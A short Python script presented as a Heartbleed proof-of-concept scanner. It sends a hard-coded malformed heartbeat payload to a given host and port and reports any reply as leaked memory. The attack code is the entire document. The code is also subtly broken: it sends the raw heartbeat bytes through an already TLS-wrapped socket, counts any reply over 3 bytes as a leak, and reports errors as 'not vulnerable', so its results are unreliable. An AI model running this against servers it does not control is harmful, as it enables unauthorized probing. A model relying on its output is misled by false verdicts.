import socket
import struct
import time
import ssl

# OpenSSL Heartbleed Proof-of-Concept Payload
HEARTBLEED_PAYLOAD = b"\x18\x03\x02\x00\x03\x01\x40\x00"

def send_heartbeat(sock):
    """Sends a Heartbleed payload and checks if the server leaks data."""
    try:
        sock.send(HEARTBLEED_PAYLOAD)
        time.sleep(1)  # Wait for response
        response = sock.recv(4096)

        if len(response) > 3:
            return True, response
        return False, None
    except Exception:
        return False, None

def check_heartbleed(host, port=443):
    """Tests if a server is vulnerable to Heartbleed by sending a malformed heartbeat request."""
    results = []

    try:
        # Create SSL Connection
        context = ssl.create_default_context()
        conn = context.wrap_socket(socket.socket(socket.AF_INET), server_hostname=host)
        conn.settimeout(5)
        conn.connect((host, port))

        # Perform the Heartbleed test
        vulnerable, leaked_data = send_heartbeat(conn)
        conn.close()

        if vulnerable:
            results.append(f"[!] Vulnerable to Heartbleed! Memory leak detected ({len(leaked_data)} bytes).")
        else:
            results.append("[+] Not vulnerable to Heartbleed. Server properly rejects heartbeat requests.")

    except (socket.timeout, socket.error, ssl.SSLError) as e:
        results.append(f"[+] No Heartbleed vulnerability detected. Error: {e}")

    return results
